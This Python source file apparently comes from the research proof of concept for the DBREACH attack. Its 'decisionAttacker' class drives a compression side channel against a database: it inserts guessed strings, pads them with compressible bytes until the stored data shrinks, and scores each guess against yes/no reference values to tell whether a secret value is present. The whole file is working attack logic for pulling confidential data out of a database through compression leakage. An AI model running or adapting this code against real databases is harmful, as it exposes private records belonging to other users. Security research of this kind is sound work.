import dbreacher
import string

class decisionAttacker():
    def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
        self.n = len(guesses)
        self.guesses = guesses
        self.dbreacher = dbreacher
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()

    def setUp(self) -> bool:
        success = self.dbreacher.reinsertFillers()
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()
        return success

    def tryAllGuesses(self, verbose = False) -> bool:
        for guess in self.guesses:
            if len(guess) not in self.bYesReferenceScores:
                curr_db_count = self.dbreacher.db_count
                try:
                    b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
                    b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
                except RuntimeError:
                    self.dbreacher.db_ref_score_count += self.dbreacher.db_count - curr_db_count
                    return False
                self.bYesReferenceScores[len(guess)] = b_yes
                self.bNoReferenceScores[len(guess)] = b_no
                self.dbreacher.db_ref_score_count += self.dbreacher.db_count - curr_db_count
            curr_db_count = self.dbreacher.db_count
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            if shrunk:
                self.dbreacher.db_guess_count += self.dbreacher.db_count - curr_db_count
                return False
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
            score = self.dbreacher.getBytesShrunkForCurrentGuess()
            self.dbreacher.db_guess_count += self.dbreacher.db_count - curr_db_count
            if verbose:
                print("\"" + guess + "\" bytesShrunk = " + str(score))
            self.bytesShrunk[guess] = score
        return True

    # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
    def getGuessAndReferenceScores(self):
        bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
        guessScoreTuples = []
        for b, g in bytesList:
            bYes = self.bYesReferenceScores[len(g)]
            bNo = self.bNoReferenceScores[len(g)]
            min_b = min(bNo, min(b, bYes))
            guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
        return guessScoreTuples
